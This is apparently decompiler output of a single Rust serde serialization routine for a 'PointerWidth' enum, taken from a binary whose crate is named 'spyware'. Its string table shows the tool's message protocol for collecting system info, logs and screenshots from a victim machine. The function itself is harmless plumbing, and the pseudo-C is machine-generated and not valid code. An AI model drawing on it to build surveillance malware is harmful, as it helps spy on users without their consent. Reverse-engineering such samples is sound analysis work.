long long spyware::communication::messages::_::<impl serde::ser::Serialize for spyware::communication::messages::PointerWidth>::serialize(unsigned long long a0, char *a1, unsigned long long a2)
{
    unsigned long long v1;  // r9
    unsigned long long v2;  // r8
    unsigned long long v3;  // 4096

    if (*(a1))
    {
        v1 = "Bit64GetBasicInfoResponseversiontarget_osoperating_system_versionpointer_widthGetLogsRequestGetLogsResponseGetScreenshotRequestDisplayScreenshotbufferwidthheightGetScreenshotResponsedisplays_screenshotsMessage";
        v2 = 1;
        v3 = a0;
    }
    else
    {
        v1 = "Bit32Bit64GetBasicInfoResponseversiontarget_osoperating_system_versionpointer_widthGetLogsRequestGetLogsResponseGetScreenshotRequestDisplayScreenshotbufferwidthheightGetScreenshotResponsedisplays_screenshotsMessage";
        v2 = 0;
        v3 = a0;
    }
    v3.serialize_unit_variant(a2, "PointerWidthBit32Bit64GetBasicInfoResponseversiontarget_osoperating_system_versionpointer_widthGetLogsRequestGetLogsResponseGetScreenshotRequestDisplayScreenshotbufferwidthheightGetScreenshotResponsedisplays_screenshotsMessage", 12, v2, v1, 5);
    return a0;
}
